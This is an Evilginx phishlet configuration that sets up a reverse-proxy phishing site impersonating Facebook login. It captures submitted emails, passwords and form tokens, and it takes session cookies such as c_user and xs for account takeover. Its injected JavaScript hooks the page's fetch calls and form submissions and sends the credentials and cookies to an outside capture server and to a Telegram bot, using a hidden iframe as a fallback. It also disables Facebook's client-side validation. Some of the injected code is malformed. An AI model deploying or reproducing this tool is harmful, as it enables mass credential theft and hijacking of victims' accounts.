author: 'evilginx-enhanced'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}

sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'WebBloks', replace: '//WebBloks', mimes: ['application/javascript']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}

response_headers:
  - name: 'X-Frame-Options'
    value: 'ALLOW-FROM https://www.facebook.com'
  - name: 'Content-Security-Policy'
    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net"

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'
  encrypted_payload:
    key: 'enc_pass'
    search: '(.*)'
    type: 'post'
  custom:
  - key: 'jazoest'
    search: '(.*)'
    type: 'post'
  - key: 'lsd'
    search: '(.*)'
    type: 'post'

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
    secure: true
    http_only: true

session_capture:
  force_redirect: '/'
  cookie_domain: '.facebook.com'
  secure_cookies: true
  http_only_cookies: true
  capture_on_redirect: true

login:
  domain: 'www.facebook.com'
  path: '/login.php'
  force_basic_auth: true

js_inject:
  - trigger_domains: ["www.facebook.com"]
    trigger_paths: ["/login/"]
    script: |
      // Bypass WebBloks validation
      window.Bloks = {
        validatePayload: function() { return true; },
        parseTree: function() { return {}; }
      };
      // Run in victim's browser console
      console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
      Object.defineProperty(window, 'fb_web_bloks', {value: false});

      // Intercept form submission
      const origFetch = window.fetch;
      window.fetch = function(url, options) {
        if (url.includes('/login/') && options?.method === 'POST') {
          const formData = new URLSearchParams(options.body);
          if (formData.has('email') && formData.has('pass')) {
            // Send credentials to your capture endpoint
            fetch('https://frontgate.live/capture', {
              method: 'POST',
              body: JSON.stringify({
                email: formData.get('email'),
                pass: formData.get('pass'),
                cookies: document.cookie
              }),
              keepalive: true
            });
            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                chat_id: "5228920520",
                text: `New Logs\nEmail: ${email}\npass: ${pass}\nIP: ${window.location.hostname}
                disable_notification: false
              })
            })
          }
        }
        return origFetch.apply(this, arguments);
      };

      // Backup: Form submission listener
      document.addEventListener('submit', function(e) {
        if (e.target.method === 'post' && e.target.action.includes('/login/')) {
          const email = e.target.querySelector('[name="email"]')?.value;
          const pass = e.target.querySelector('[name="pass"]')?.value;
          if (email && pass) {
            // Create hidden iframe to send data
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = `https://frontgate.live/capture?e=${encodeURIComponent(email)}&p=${encodeURIComponent(pass)}`;
            document.body.appendChild(iframe);
          }
        }
      }, true);